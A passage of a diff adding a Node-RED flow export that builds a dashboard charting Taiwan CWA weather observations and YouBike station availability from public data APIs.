@@ -1,0 +1,2108 @@
+[
+    {
+        "disabled": false,
+        "env": [],
+        "id": "d8842b55346820a3",
+        "info": "",
+        "label": "即時氣象",
+        "type": "tab"
+    },
+    {
+        "disabled": false,
+        "env": [],
+        "id": "e6fc27779f02719e",
+        "info": "",
+        "label": "youbike",
+        "type": "tab"
+    },
+    {
+        "disabled": false,
+        "env": [],
+        "id": "ec1515cb77dddea4",
+        "info": "",
+        "label": "承研Sensor",
+        "type": "tab"
+    },
+    {
+        "disabled": false,
+        "hidden": false,
+        "icon": "dashboard",
+        "id": "82b9e427369059d1",
+        "name": "Weather(抓取氣象資料)",
+        "type": "ui_tab"
+    },
+    {
+        "className": "",
+        "collapse": false,
+        "disp": true,
+        "id": "91c349f5401b4c59",
+        "name": "即時氣象",
+        "order": 1,
+        "tab": "82b9e427369059d1",
+        "type": "ui_group",
+        "width": 6
+    },
+    {
+        "className": "",
+        "collapse": false,
+        "disp": true,
+        "id": "4f56df17ac6a4366",
+        "name": "趨勢圖表",
+        "order": 2,
+        "tab": "82b9e427369059d1",
+        "type": "ui_group",
+        "width": "18"
+    },
+    {
+        "disabled": false,
+        "hidden": false,
+        "icon": "dashboard",
+        "id": "11993bd55eff2a4a",
+        "name": "Youbike(抓取政府公開資料)",
+        "type": "ui_tab"
+    },
+    {
+        "className": "",
+        "collapse": false,
+        "disp": true,
+        "id": "47fb02424927dedf",
+        "name": "內湖站台",
+        "order": 1,
+        "tab": "11993bd55eff2a4a",
+        "type": "ui_group",
+        "width": "12"
+    },
+    {
+        "className": "",
+        "collapse": false,
+        "disp": true,
+        "id": "a69c8bbeee6079d8",
+        "name": "公館站台",
+        "order": 2,
+        "tab": "11993bd55eff2a4a",
+        "type": "ui_group",
+        "width": "12"
+    },
+    {
+        "id": "467c20e18172fa0f",
+        "site": {
+            "allowSwipe": "false",
+            "allowTempTheme": "true",
+            "dateFormat": "DD/MM/YYYY",
+            "hideToolbar": "false",
+            "lockMenu": "false",
+            "name": "Node-RED Dashboard",
+            "sizes": {
+                "cx": 6,
+                "cy": 6,
+                "gx": 6,
+                "gy": 6,
+                "px": 0,
+                "py": 0,
+                "sx": 48,
+                "sy": 48
+            }
+        },
+        "theme": {
+            "angularTheme": {
+                "accents": "blue",
+                "background": "grey",
+                "palette": "light",
+                "primary": "indigo",
+                "warn": "red"
+            },
+            "customTheme": {
+                "baseColor": "#4B7930",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
+                "default": "#4B7930",
+                "name": "Untitled Theme 1"
+            },
+            "darkTheme": {
+                "baseColor": "#097479",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
+                "default": "#097479",
+                "edited": false
+            },
+            "lightTheme": {
+                "baseColor": "#0094CE",
+                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
+                "default": "#0094CE",
+                "edited": true,
+                "reset": false
+            },
+            "name": "theme-light",
+            "themeState": {
+                "base-color": {
+                    "default": "#0094CE",
+                    "edited": false,
+                    "value": "#0094CE"
+                },
+                "base-font": {
+                    "value": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
+                },
+                "group-backgroundColor": {
+                    "edited": false,
+                    "value": "#ffffff"
+                },
+                "group-borderColor": {
+                    "edited": false,
+                    "value": "#ffffff"
+                },
+                "group-textColor": {
+                    "edited": false,
+                    "value": "#1bbfff"
+                },
+                "page-backgroundColor": {
+                    "edited": false,
+                    "value": "#fafafa"
+                },
+                "page-sidebar-backgroundColor": {
+                    "edited": false,
+                    "value": "#ffffff"
+                },
+                "page-titlebar-backgroundColor": {
+                    "edited": false,
+                    "value": "#0094CE"
+                },
+                "widget-backgroundColor": {
+                    "edited": false,
+                    "value": "#0094ce"
+                },
+                "widget-borderColor": {
+                    "edited": false,
+                    "value": "#ffffff"
+                },
+                "widget-textColor": {
+                    "edited": false,
+                    "value": "#111111"
+                }
+            }
+        },
+        "type": "ui_base"
+    },
+    {
+        "disabled": false,
+        "hidden": false,
+        "icon": "dashboard",
+        "id": "225ad52cc794febc",
+        "name": "承研Sensor(Sensor與Api串接)",
+        "order": 3,
+        "type": "ui_tab"
+    },
+    {
+        "className": "",
+        "collapse": false,
+        "disp": true,
+        "id": "caaebaddf18725fa",
+        "name": "空氣品質",
+        "order": 1,
+        "tab": "225ad52cc794febc",
+        "type": "ui_group",
+        "width": "12"
+    },
+    {
+        "className": "",
+        "collapse": false,
+        "disp": true,
+        "id": "a967817bd922222a",
+        "name": "溫感舒適",
+        "order": 2,
+        "tab": "225ad52cc794febc",
+        "type": "ui_group",
+        "width": "12"
+    },
+    {
+        "group": "caaebaddf18725fa",
+        "height": 1,
+        "id": "9871d701b62d4e3a",
+        "name": "spacer",
+        "order": 4,
+        "type": "ui_spacer",
+        "width": 6,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "group": "a967817bd922222a",
+        "height": 1,
+        "id": "02f9c79330c81c38",
+        "name": "spacer",
+        "order": 3,
+        "type": "ui_spacer",
+        "width": 6,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "crontab": "",
+        "id": "92697d215102e745",
+        "name": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "payload": "",
+        "payloadType": "date",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "120",
+        "topic": "",
+        "type": "inject",
+        "wires": [
+            [
+                "3222563b458deb46"
+            ]
+        ],
+        "x": 150,
+        "y": 180,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "authType": "",
+        "headers": [],
+        "id": "3222563b458deb46",
+        "insecureHTTPParser": false,
+        "method": "GET",
+        "name": "",
+        "paytoqs": "ignore",
+        "persist": false,
+        "proxy": "",
+        "ret": "obj",
+        "senderr": false,
+        "tls": "",
+        "type": "http request",
+        "url": "https://opendata.cwa.gov.tw/api/v1/rest/datastore/O-A0001-001?Authorization=CWA-23A85806-5FF0-4163-A006-FE38B48F7500",
+        "wires": [
+            [
+                "7a93505cd70c069d",
+                "64b21ab110ec5681"
+            ]
+        ],
+        "x": 330,
+        "y": 180,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "className": "",
+        "format": "<table><tr><td>\n<div>地址：{{msg.payload.StationName}} </div>\n<div>時間：<font color=red>{{msg.payload.ObsTime.DateTime}} </font></div>\n<div>標高：{{msg.payload.GeoInfo.StationAltitude}}</div>\n<div>天氣：{{msg.payload.WeatherElement.Weather}}</div>\n<div>風向：{{msg.payload.WeatherElement.WindDirection}}</div>\n<div>風速：{{msg.payload.WeatherElement.WindSpeed}}</div>\n<div>氣溫：{{msg.payload.WeatherElement.AirTemperature}}</div>\n<div>溼度：{{msg.payload.WeatherElement.RelativeHumidity}}</div>\n<div>氣壓：{{msg.payload.WeatherElement.AirPressure}}</div>\n<div>最高：{{msg.payload.WeatherElement.DailyExtreme.DailyHigh.TemperatureInfo.AirTemperature}}</div>\n<div>最低：{{msg.payload.WeatherElement.DailyExtreme.DailyLow.TemperatureInfo.AirTemperature}}</div>\n</td></tr></table>",
+        "fwdInMessages": true,
+        "group": "91c349f5401b4c59",
+        "height": 0,
+        "id": "11b5ba368a2ba145",
+        "name": "信義",
+        "order": 1,
+        "resendOnRefresh": true,
+        "storeOutMessages": true,
+        "templateScope": "local",
+        "type": "ui_template",
+        "width": 0,
+        "wires": [
+            []
+        ],
+        "x": 670,
+        "y": 40,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "finalize": "",
+        "func": "let stations = msg.payload.records.Station;\n\nlet targetStation = stations.find(station => station.StationName === \"信義\");\n\nif (targetStation) {\n    msg.payload = targetStation;\n} else {\n    msg.payload = { error: \"找不到 StationName 為 '信義' 的資料\" };\n}\n\nreturn msg;",
+        "id": "7a93505cd70c069d",
+        "initialize": "",
+        "libs": [],
+        "name": "信義",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "11b5ba368a2ba145",
+                "5a608a0613308c8a",
+                "f5d8b9163b8311fc",
+                "06d655c18036f62b",
+                "3defb5055f37b03e"
+            ]
+        ],
+        "x": 510,
+        "y": 180,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "4f56df17ac6a4366",
+        "height": 3,
+        "id": "c858ae1037a20759",
+        "interpolate": "linear",
+        "label": "風速(公尺/秒)",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 1,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 18,
+        "wires": [
+            []
+        ],
+        "x": 970,
+        "xformat": "HH:mm:ss",
+        "y": 220,
+        "ymax": "",
+        "ymin": "",
+        "z": "d8842b55346820a3"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "5a608a0613308c8a",
+        "name": "風速",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.WeatherElement.WindSpeed",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "c858ae1037a20759"
+            ]
+        ],
+        "x": 690,
+        "y": 220,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "4f56df17ac6a4366",
+        "height": 3,
+        "id": "4ac5f6136ada0999",
+        "interpolate": "linear",
+        "label": "氣溫(C)",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 2,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 18,
+        "wires": [
+            []
+        ],
+        "x": 980,
+        "xformat": "HH:mm:ss",
+        "y": 280,
+        "ymax": "",
+        "ymin": "",
+        "z": "d8842b55346820a3"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "f5d8b9163b8311fc",
+        "name": "溫度",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.WeatherElement.AirTemperature",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "4ac5f6136ada0999"
+            ]
+        ],
+        "x": 690,
+        "y": 280,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "4f56df17ac6a4366",
+        "height": 3,
+        "id": "6b75e0fb5b11b9ad",
+        "interpolate": "linear",
+        "label": "濕度",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 3,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 18,
+        "wires": [
+            []
+        ],
+        "x": 970,
+        "xformat": "HH:mm:ss",
+        "y": 340,
+        "ymax": "",
+        "ymin": "",
+        "z": "d8842b55346820a3"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "06d655c18036f62b",
+        "name": "濕度",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.WeatherElement.RelativeHumidity",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "6b75e0fb5b11b9ad"
+            ]
+        ],
+        "x": 690,
+        "y": 340,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#1f77b4",
+            "#aec7e8",
+            "#ff7f0e",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "4f56df17ac6a4366",
+        "height": 3,
+        "id": "0b1f5928367c0c5a",
+        "interpolate": "linear",
+        "label": "氣壓",
+        "legend": "false",
+        "name": "",
+        "nodata": "",
+        "order": 4,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 18,
+        "wires": [
+            []
+        ],
+        "x": 970,
+        "xformat": "HH:mm:ss",
+        "y": 400,
+        "ymax": "",
+        "ymin": "",
+        "z": "d8842b55346820a3"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "3defb5055f37b03e",
+        "name": "氣壓",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.WeatherElement.AirPressure",
+                "tot": "msg"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "0b1f5928367c0c5a"
+            ]
+        ],
+        "x": 690,
+        "y": 400,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "finalize": "",
+        "func": "let stations = msg.payload.records.Station;\n\nlet targetStation = stations.find(station => station.StationName === \"臺東\");\n\nif (targetStation) {\n    msg.payload = targetStation;\n} else {\n    msg.payload = { error: \"找不到 StationName 為 '內湖' 的資料\" };\n}\n\nreturn msg;\n\n\n//msg.payload = msg.payload.records.Station[306];\n//return msg;",
+        "id": "64b21ab110ec5681",
+        "initialize": "",
+        "libs": [],
+        "name": "內湖",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "409ad5af7d7900c5"
+            ]
+        ],
+        "x": 530,
+        "y": 500,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "className": "",
+        "format": "<hr>\n<table><tr><td>\n<div>地址：{{msg.payload.StationName}} </div>\n<div>時間：<font color=red>{{msg.payload.ObsTime.DateTime}} </font></div>\n<div>標高：{{msg.payload.GeoInfo.StationAltitude}}</div>\n<div>天氣：{{msg.payload.WeatherElement.Weather}}</div>\n<div>風向：{{msg.payload.WeatherElement.WindDirection}}</div>\n<div>風速：{{msg.payload.WeatherElement.WindSpeed}}</div>\n<div>氣溫：{{msg.payload.WeatherElement.AirTemperature}}</div>\n<div>溼度：{{msg.payload.WeatherElement.RelativeHumidity}}</div>\n<div>氣壓：{{msg.payload.WeatherElement.AirPressure}}</div>\n<div>最高：{{msg.payload.WeatherElement.DailyExtreme.DailyHigh.TemperatureInfo.AirTemperature}}</div>\n<div>最低：{{msg.payload.WeatherElement.DailyExtreme.DailyLow.TemperatureInfo.AirTemperature}}</div>\n</td></tr></table>",
+        "fwdInMessages": true,
+        "group": "91c349f5401b4c59",
+        "height": 0,
+        "id": "409ad5af7d7900c5",
+        "name": "內湖",
+        "order": 2,
+        "resendOnRefresh": true,
+        "storeOutMessages": true,
+        "templateScope": "local",
+        "type": "ui_template",
+        "width": 0,
+        "wires": [
+            []
+        ],
+        "x": 690,
+        "y": 500,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "active": true,
+        "complete": "false",
+        "console": false,
+        "id": "4e37237f0e4d29a2",
+        "name": "debug 1",
+        "statusType": "auto",
+        "statusVal": "",
+        "tosidebar": true,
+        "tostatus": false,
+        "type": "debug",
+        "wires": [],
+        "x": 480,
+        "y": 60,
+        "z": "d8842b55346820a3"
+    },
+    {
+        "crontab": "",
+        "id": "70a3a6369088230d",
+        "name": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "payload": "",
+        "payloadType": "date",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "120",
+        "topic": "",
+        "type": "inject",
+        "wires": [
+            [
+                "32779250604a83f0"
+            ]
+        ],
+        "x": 150,
+        "y": 100,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "authType": "",
+        "headers": [],
+        "id": "32779250604a83f0",
+        "insecureHTTPParser": false,
+        "method": "GET",
+        "name": "",
+        "paytoqs": "ignore",
+        "persist": false,
+        "proxy": "",
+        "ret": "obj",
+        "senderr": false,
+        "tls": "",
+        "type": "http request",
+        "url": "https://tcgbusfs.blob.core.windows.net/dotapp/youbike/v2/youbike_immediate.json",
+        "wires": [
+            [
+                "cc0feb4e2ba153e7",
+                "986e450f85561508",
+                "b9cdd1b85f452ca9",
+                "4af3a6573d099e6e",
+                "4b624aa5ef32d73c",
+                "57f3a344a126e90d"
+            ]
+        ],
+        "x": 330,
+        "y": 100,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "finalize": "",
+        "func": "// 在 function 節點裡的程式碼\nlet data = msg.payload;   // HTTP request 回傳的 JSON 陣列\n\n// 找出站名包含 \"科技大樓站\" 的項目\nlet target = data.find(station => station.sna.includes(\"科技大樓站\"));\n\n// 把結果放到 msg.payload\nmsg.payload = target;\n\nreturn msg;\n",
+        "id": "cc0feb4e2ba153e7",
+        "initialize": "",
+        "libs": [],
+        "name": "科技大樓站",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "0ff5fc6cf7937b9e",
+                "67e600088bb155ca"
+            ]
+        ],
+        "x": 530,
+        "y": 100,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "0ff5fc6cf7937b9e",
+        "name": "可借",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_rent_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可借",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "e6d18e1d01cdda42"
+            ]
+        ],
+        "x": 710,
+        "y": 80,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "67e600088bb155ca",
+        "name": "可還",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_return_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可還",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "e6d18e1d01cdda42"
+            ]
+        ],
+        "x": 710,
+        "y": 120,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#e60a2b",
+            "#92c408",
+            "#7b4c24",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "a69c8bbeee6079d8",
+        "height": 4,
+        "id": "e6d18e1d01cdda42",
+        "interpolate": "linear",
+        "label": "科技大樓站",
+        "legend": "true",
+        "name": "",
+        "nodata": "",
+        "order": 1,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 1170,
+        "xformat": "HH:mm:ss",
+        "y": 120,
+        "ymax": "",
+        "ymin": "",
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "finalize": "",
+        "func": "// 在 function 節點裡的程式碼\nlet data = msg.payload;   // HTTP request 回傳的 JSON 陣列\n\n// 找出站名包含 \"科技大樓站\" 的項目\nlet target = data.find(station => station.sna.includes(\"世紀經貿\"));\n\n// 把結果放到 msg.payload\nmsg.payload = target;\n\nreturn msg;\n",
+        "id": "986e450f85561508",
+        "initialize": "",
+        "libs": [],
+        "name": "世紀經貿",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "1eaa536840799f90",
+                "78d2862616db5b41"
+            ]
+        ],
+        "x": 560,
+        "y": 180,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "1eaa536840799f90",
+        "name": "可借",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_rent_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可借",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "a3a29f34208db07f"
+            ]
+        ],
+        "x": 710,
+        "y": 160,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "78d2862616db5b41",
+        "name": "可還",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_return_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可還",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "a3a29f34208db07f"
+            ]
+        ],
+        "x": 710,
+        "y": 200,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#e60a2b",
+            "#92c408",
+            "#7b4c24",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "47fb02424927dedf",
+        "height": 4,
+        "id": "a3a29f34208db07f",
+        "interpolate": "linear",
+        "label": "世紀經貿",
+        "legend": "true",
+        "name": "",
+        "nodata": "",
+        "order": 1,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 1180,
+        "xformat": "HH:mm:ss",
+        "y": 180,
+        "ymax": "",
+        "ymin": "",
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "finalize": "",
+        "func": "// 在 function 節點裡的程式碼\nlet data = msg.payload;   // HTTP request 回傳的 JSON 陣列\n\n// 找出站名包含 \"科技大樓站\" 的項目\nlet target = data.find(station => station.sna.includes(\"新生南路三段94巷口\"));\n\n// 把結果放到 msg.payload\nmsg.payload = target;\n\nreturn msg;\n",
+        "id": "b9cdd1b85f452ca9",
+        "initialize": "",
+        "libs": [],
+        "name": "新生南路三段94巷口",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "823e8ce4f90703e0",
+                "7665d3551485763c"
+            ]
+        ],
+        "x": 580,
+        "y": 260,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "823e8ce4f90703e0",
+        "name": "可借",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_rent_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可借",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "e1fe1598809401e6"
+            ]
+        ],
+        "x": 770,
+        "y": 240,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "7665d3551485763c",
+        "name": "可還",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_return_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可還",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "e1fe1598809401e6"
+            ]
+        ],
+        "x": 770,
+        "y": 280,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#e60a2b",
+            "#92c408",
+            "#7b4c24",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "a69c8bbeee6079d8",
+        "height": 4,
+        "id": "e1fe1598809401e6",
+        "interpolate": "linear",
+        "label": "新生南路三段94巷口",
+        "legend": "true",
+        "name": "",
+        "nodata": "",
+        "order": 2,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 1180,
+        "xformat": "HH:mm:ss",
+        "y": 280,
+        "ymax": "",
+        "ymin": "",
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "finalize": "",
+        "func": "// 在 function 節點裡的程式碼\nlet data = msg.payload;   // HTTP request 回傳的 JSON 陣列\n\n// 找出站名包含 \"科技大樓站\" 的項目\nlet target = data.find(station => station.sna.includes(\"新生南路三段82號前\"));\n\n// 把結果放到 msg.payload\nmsg.payload = target;\n\nreturn msg;\n",
+        "id": "4af3a6573d099e6e",
+        "initialize": "",
+        "libs": [],
+        "name": "新生南路三段82號前",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "029b85d497d09108",
+                "932ee25c977817ed"
+            ]
+        ],
+        "x": 580,
+        "y": 340,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "029b85d497d09108",
+        "name": "可借",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_rent_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可借",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "59a55345060b4bc6"
+            ]
+        ],
+        "x": 770,
+        "y": 340,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "action": "",
+        "from": "",
+        "id": "932ee25c977817ed",
+        "name": "可還",
+        "property": "",
+        "reg": false,
+        "rules": [
+            {
+                "p": "payload",
+                "pt": "msg",
+                "t": "set",
+                "to": "msg.payload.available_return_bikes",
+                "tot": "msg"
+            },
+            {
+                "p": "topic",
+                "pt": "msg",
+                "t": "set",
+                "to": "可還",
+                "tot": "str"
+            }
+        ],
+        "to": "",
+        "type": "change",
+        "wires": [
+            [
+                "59a55345060b4bc6"
+            ]
+        ],
+        "x": 770,
+        "y": 400,
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "chartType": "line",
+        "className": "",
+        "colors": [
+            "#e60a2b",
+            "#92c408",
+            "#7b4c24",
+            "#2ca02c",
+            "#98df8a",
+            "#d62728",
+            "#ff9896",
+            "#9467bd",
+            "#c5b0d5"
+        ],
+        "cutout": 0,
+        "dot": false,
+        "group": "a69c8bbeee6079d8",
+        "height": 4,
+        "id": "59a55345060b4bc6",
+        "interpolate": "linear",
+        "label": "新生南路三段82號前",
+        "legend": "true",
+        "name": "",
+        "nodata": "",
+        "order": 3,
+        "outputs": 1,
+        "removeOlder": "24",
+        "removeOlderPoints": "",
+        "removeOlderUnit": "3600",
+        "type": "ui_chart",
+        "useDifferentColor": false,
+        "useOneColor": false,
+        "useUTC": false,
+        "width": 12,
+        "wires": [
+            []
+        ],
+        "x": 1220,
+        "xformat": "HH:mm:ss",
+        "y": 360,
+        "ymax": "",
+        "ymin": "",
+        "z": "e6fc27779f02719e"
+    },
+    {
+        "finalize": "",
+        "func": "// 在 function 節點裡的程式碼\nlet data = msg.payload;   // HTTP request 回傳的 JSON 陣列\n\n// 找出站名包含 \"科技大樓站\" 的項目\nlet target = data.find(station => station.sna.includes(\"文德三號公園(江南街71巷16弄)\"));\n\n// 把結果放到 msg.payload\nmsg.payload = target;\n\nreturn msg;\n",
+        "id": "4b624aa5ef32d73c",
+        "initialize": "",
+        "libs": [],
+        "name": "文德三號公園(江南街71巷16弄)",
+        "noerr": 0,
+        "outputs": 1,
+        "timeout": 0,
+        "type": "function",
+        "wires": [
+            [
+                "e555cad7895289de",
